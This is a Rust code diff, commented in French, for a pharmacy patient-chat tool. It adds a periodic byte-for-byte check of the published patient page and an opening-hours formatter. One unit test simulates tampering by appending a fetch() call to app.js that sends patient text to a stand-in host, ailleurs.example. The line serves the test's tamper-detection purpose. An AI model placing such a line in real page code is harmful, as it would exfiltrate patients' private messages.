@@ -14,7 +14,7 @@ use std::sync::{mpsc, Arc, Mutex};
 use std::time::Duration;
 
 use crate::db::Db;
-use crate::patientchat::{self, FromPatient, KeyRow, Store, ToPatient};
+use crate::patientchat::{self, FromPatient, KeyRow, Officine, Store, ToPatient};
 
 /// Combien d'attentes à la fois, par poste.
 const WAITERS: usize = 2;
@@ -24,6 +24,8 @@ const PATIENCE: Duration = Duration::from_secs(10);
 const WORD_WAIT: Duration = Duration::from_secs(10);
 /// Après un échec (passerelle éteinte, nom inconnu), avant de rappeler.
 const BACKOFF: Duration = Duration::from_secs(30);
+/// Tous les combien la page publiée est comparée à celle qu'on livre.
+const PAGE_EVERY: Duration = Duration::from_secs(6 * 3600);
 
 /// Ce que le fil dit à l'écran.
 #[derive(Debug, PartialEq, Eq)]
@@ -35,12 +37,90 @@ pub enum Event {
     Unreachable(String),
     /// Elle répond de nouveau.
     Reached,
+    /// Ce que la page publiée est, comparée à la nôtre.
+    Page(PageCheck),
+}
+
+/// **La page publiée, vue d'un poste** (`check_page`).
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum PageCheck {
+    /// Octet pour octet celle que ce logiciel livre.
+    Same,
+    /// Autre chose : qui l'ouvre ne chiffre peut-être plus comme le
+    /// poste. L'officine est prévenue ; elle ne cesse pas d'attendre —
+    /// cesser ne protégerait pas un patient qui écrit déjà sur la page.
+    Different,
+    /// Pas lue (pas encore publiée, ou hors ligne) : rien n'est dit de
+    /// plus qu'un avertissement discret.
+    Unread(String),
+}
+
+/// **Comparer la page publiée à la nôtre** : chacun des trois fichiers de
+/// `patientchat::PAGE_FILES`, lu sous `patientchat::page_url()` par
+/// `fetch`. L'empreinte est dans l'adresse ; ce sont les octets servis
+/// qu'on compare — un dossier réécrit sous le même nom se voit.
+pub fn check_page(fetch: impl Fn(&str) -> Result<Vec<u8>, String>) -> PageCheck {
+    let base = patientchat::page_url();
+    for (name, ours) in patientchat::PAGE_FILES {
+        match fetch(&format!("{base}{name}")) {
+            Ok(theirs) if theirs == ours.as_bytes() => {}
+            Ok(_) => return PageCheck::Different,
+            Err(e) => return PageCheck::Unread(e),
+        }
+    }
+    PageCheck::Same
+}
+
+/// Lire un fichier de la page publiée, en HTTPS seulement.
+fn fetch_https(url: &str) -> Result<Vec<u8>, String> {
+    let agent = ureq::AgentBuilder::new()
+        .https_only(true)
+        .timeout_connect(Duration::from_secs(10))
+        .timeout_read(Duration::from_secs(15))
+        .user_agent("bpm-caddy")
+        .build();
+    let mut body = Vec::new();
+    std::io::Read::read_to_end(
+        &mut std::io::Read::take(
+            agent
+                .get(url)
+                .call()
+                .map_err(|e| e.to_string())?
+                .into_reader(),
+            1 << 20,
+        ),
+        &mut body,
+    )
+    .map_err(|e| e.to_string())?;
+    Ok(body)
+}
+
+/// **Les heures d'ouverture, en clair**, pour la page : les plages de
+/// chaque jour à la suite, dans l'ordre où l'officine les a écrites —
+/// `(jour, de, à)`.
+pub fn opening_hours(rows: &[(String, String, String)]) -> String {
+    let mut days: Vec<(String, Vec<String>)> = Vec::new();
+    for (day, from, to) in rows {
+        let (day, from, to) = (day.trim().to_lowercase(), from.trim(), to.trim());
+        if day.is_empty() || from.is_empty() || to.is_empty() {
+            continue;
+        }
+        let span = format!("{from}-{to}");
+        match days.iter_mut().find(|(d, _)| *d == day) {
+            Some((_, spans)) => spans.push(span),
+            None => days.push((day, vec![span])),
+        }
+    }
+    days.into_iter()
+        .map(|(d, spans)| format!("{d} {}", spans.join(" et ")))
+        .collect::<Vec<_>>()
+        .join(" ; ")
 }
 
 /// La base, vue par une conversation.
 pub struct DbStore<'a> {
     pub db: &'a Db,
-    pub officine: String,
+    pub officine: Officine,
 }
 
 /// L'heure d'un message, pour la page : `JJ/MM/AAAA HH:MM`.
@@ -88,7 +168,7 @@ impl Store for DbStore<'_> {
             .collect())
     }
 
-    fn officine(&mut self) -> String {
+    fn officine(&mut self) -> Officine {
         self.officine.clone()
     }
 }
@@ -130,7 +210,7 @@ pub fn spawn(
     password: String,
     gateway: &str,
     secret: String,
-    officine: String,
+    officine: Officine,
 ) -> Waiting {
     let stop = Arc::new(AtomicBool::new(false));
     let held: Arc<Mutex<Vec<(u64, std::net::TcpStream)>>> = Arc::default();
@@ -175,6 +255,19 @@ pub fn spawn(
                             std::thread::sleep(Duration::from_millis(250));
                         }
                     }
+                }
+            }
+        });
+    }
+    // The page the patients open, compared now and then to ours.
+    {
+        let (stop, events_tx) = (Arc::clone(&stop), events_tx.clone());
+        std::thread::spawn(move || {
+            while !stop.load(Ordering::SeqCst) {
+                let _ = events_tx.send(Event::Page(check_page(fetch_https)));
+                let until = std::time::Instant::now() + PAGE_EVERY;
+                while std::time::Instant::now() < until && !stop.load(Ordering::SeqCst) {
+                    std::thread::sleep(Duration::from_millis(500));
                 }
             }
         });
@@ -240,6 +333,50 @@ mod tests {
         }
     }
 
+    /// The published page is ours byte for byte, or the officine hears
+    /// it; one that cannot be read says why.
+    #[test]
+    fn the_published_page_is_compared_to_ours() {
+        let ours = |url: &str| -> Result<Vec<u8>, String> {
+            assert!(url.starts_with(&patientchat::page_url()), "{url}");
+            let name = url.rsplit('/').next().unwrap();
+            patientchat::PAGE_FILES
+                .iter()
+                .find(|(n, _)| *n == name)
+                .map(|(_, b)| b.as_bytes().to_vec())
+                .ok_or_else(|| "404".to_owned())
+        };
+        assert_eq!(check_page(ours), PageCheck::Same);
+        let altered = |url: &str| {
+            let mut b = ours(url)?;
+            if url.ends_with("app.js") {
+                b.extend_from_slice(b"fetch('https://ailleurs.example', {body: texte});");
+            }
+            Ok(b)
+        };
+        assert_eq!(check_page(altered), PageCheck::Different);
+        assert_eq!(
+            check_page(|_| Err("404".to_owned())),
+            PageCheck::Unread("404".into())
+        );
+    }
+
+    #[test]
+    fn opening_hours_read_as_a_patient_reads_them() {
+        let row = |d: &str, f: &str, t: &str| (d.to_owned(), f.to_owned(), t.to_owned());
+        assert_eq!(
+            opening_hours(&[
+                row("Lundi", "09:00", "12:30"),
+                row("lundi", "14:00", "19:30"),
+                row("samedi", "09:00", "12:00"),
+                row("", "09:00", "12:00"),
+                row("mardi", "09:00", ""),
+            ]),
+            "lundi 09:00-12:30 et 14:00-19:30 ; samedi 09:00-12:00"
+        );
+        assert_eq!(opening_hours(&[]), "");
+    }
+
     #[test]
     fn a_time_for_the_page() {
         assert_eq!(shown_at("2026-10-14 09:05"), "14/10/2026 09:05");
@@ -276,11 +413,16 @@ mod tests {
         };
         let (web, posts) = (free(), free());
         let stop = Arc::new(AtomicBool::new(false));
-        crate::passerelle::serve(web, posts, Arc::clone(&stop)).unwrap();
+        let mut options = crate::passerelle::Options::new(web, posts);
+        options.origins.push(format!("http://{web}"));
+        crate::passerelle::serve(options, Arc::clone(&stop)).unwrap();
         let secret = "c3".repeat(32);
         let mut store = DbStore {
             db: &db,
-            officine: "Pharmacie du Port".into(),
+            officine: Officine {
+                nom: "Pharmacie du Port".into(),
+                ..Default::default()
+            },
         };
         let talk = |store: &mut DbStore, request: patientchat::Request| {
             let (posts_at, secret2) = (posts.to_string(), secret.clone());
